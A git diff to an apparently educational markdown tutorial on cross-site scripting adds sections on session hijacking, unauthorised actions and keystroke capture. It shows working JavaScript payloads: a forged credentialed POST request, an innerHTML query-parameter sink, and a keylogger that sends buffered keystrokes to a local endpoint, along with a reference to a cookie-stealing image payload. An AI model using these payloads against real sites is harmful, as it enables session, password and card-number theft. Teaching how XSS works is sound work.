@@ -20,6 +20,9 @@ suppose you have your website called "mango.com", If some hacker can able to inj
 
 **With XSS these vulnarabilities might be direct threat to your secured data.**
 
+#### User session Hacking:
+<hr>
+
 Simple Example::(Codes)
 
 ```js
@@ -100,9 +103,79 @@ document.querySelector(\'body\').appendChild(img);
 we are passing an image tag, Script tags can't be injected nowadays because browsers are pretty secure and smart. So this hack can be done. If src is "does not exist" it'll call onerror, In a script we are creating a dom node of img and setting src as a url which contail document.cookie which is your cookie (Fucked up).so in that endpoint mentioned after the img.src. the request was rend with the cookie data.
 
 
-TEST:
+**TEST:**
 <img width="900" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/2a8c7b94-0b36-4409-ad48-cb874c711d89">
 
-We have testing and yes the script was injecting the image tag and exposing the user cookies as well.
+<br>
 
+<img width="714" alt="image" src="https://github.com/SaurabhMulay999/FrontEnd-Design/assets/90036775/5f029073-2a93-470e-bdd2-e3f061205568">
+
+**We had tested as above and yes the script was injecting the image tag and exposing the user cookies as well.**
+
+**Lets check more examples:**
+
+#### Unauthorised Activities:
+<hr>
+
+Taking unauth access and doing something on behalf of YOU.
+
+```js
+<script>
+    function Post(title,description){
+        var xhr=new XMLHttpRequest();
+        xhr.open("POST",'/post',true);
+        console.log(document.cookie);
+        xhr.withCredentials=true;
+        xhr.setRequestHeader(
+            "Content-type",
+            "application/x-www-form-urlencoded"
+        );
+        xhr.send(`txtname=${title} & msg=${description}`);
+    }
+</script>
+```
+
+This will goin to create a post request on your own application and just send the request. how this will create a problem??
+
+
+```js
+
+<script>
+    const param=new URLSearchParams(window.location.search);
+    const name=param.get('name');
+    document.getElementById('username').innerHTML=name;
+</script>
+
+```
+
+suppose from query param above we having. suppose i have written a code or query param in such a way that i'll trigger the method post with some title or some params then it'll again thread to the security.
+
+
+#### Capturing Keystrokes:
+<hr>
+
+If maliciously I passed below script as a query param then that script will execute in back and it'll capture each and every keystroke of user.
+
+```js
+<script>
+    var timeout;
+    var buffer="";
+    document.querySelector('body').addEventListener('keypress',
+    function(event){
+        if(event.which!==0){
+            clearTimeout(timeout);
+            buffer+=String.fromCharCode(event.which);
+            timeout=setTimeout(function(){
+                var xhr=new XMLHttpRequest();
+                var uri='http://localhost:5500/keys?data='+encodeURIComponent(buffer);
+                xhr.open('GET',uri);
+                xhr.send();
+                buffer= '';
+            },400)
+        }
+    })
+</script>
+```
+
+and everytime user writing something code script will just pick the keystrokes and make a request to uri with the user input /data as a payload. This will potentially pick your credit card number then password and will be direct threat to your security.
 
